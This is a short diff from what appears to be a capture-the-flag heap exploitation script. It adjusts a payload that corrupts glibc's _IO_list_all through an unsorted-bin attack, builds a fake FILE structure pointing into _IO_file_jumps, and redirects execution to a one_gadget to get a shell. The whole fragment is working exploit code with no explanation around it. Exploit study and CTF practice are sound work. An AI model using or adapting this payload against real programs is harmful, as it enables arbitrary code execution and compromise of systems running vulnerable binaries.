@@ -314,7 +314,7 @@ dele(1)
 # then rewrite the next unsorted bin, finish the attack!
 add(0x118)
 payload=p64(0)*3+p64(0x61)
-payload+=p64(0)+p64(_IO_list_all+libc_base)
+payload+=p64(0)+p64(_IO_list_all+libc_base-0x10)
 payload+=p64(0)+p64(1)
 payload+=p64(0)*21+p64(_IO_file_jumps+libc_base+0xc0)
 payload+=p64(one_gadget+libc_base)
